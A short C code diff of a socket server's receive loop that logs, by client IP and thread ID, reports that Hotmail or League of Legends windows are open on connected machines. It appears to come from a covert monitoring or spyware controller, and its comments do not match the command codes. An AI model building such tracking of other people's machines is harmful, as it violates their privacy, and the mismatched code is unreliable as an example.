@@ -157,8 +157,9 @@ char *ip = inet_ntoa(client_info.sin_addr);
 
 //____________MAIN RECEIVE LOOP
  while(recv(Client,databuffer,200,0) != SOCKET_ERROR){ //While the client is still connected
-    if(*databuffer == '0') printf("[!]Hotmail open on  \t ID:%d \t  IP:%s\n\n" , GetCurrentThreadId(),ip); //Window open command 0 received
-    if(*databuffer == '*') printf("[i]Ping from \t ID:%d \t  IP:%s\n" , GetCurrentThreadId(),ip); //Ping command * received
+    if(*databuffer == 00) printf("[i]Ping from \t ID:%d \t  IP:%s\n" , GetCurrentThreadId(),ip); //Ping command * received
+    if(*databuffer == 01) printf("[!]Legue of legends open on  \t ID:%d \t  IP:%s\n" , GetCurrentThreadId(),ip); //Window open command 0 received
+    if(*databuffer == 02) printf("[i]Ping from \t ID:%d \t  IP:%s\n" , GetCurrentThreadId(),ip); //Window focus command
      //
 
 
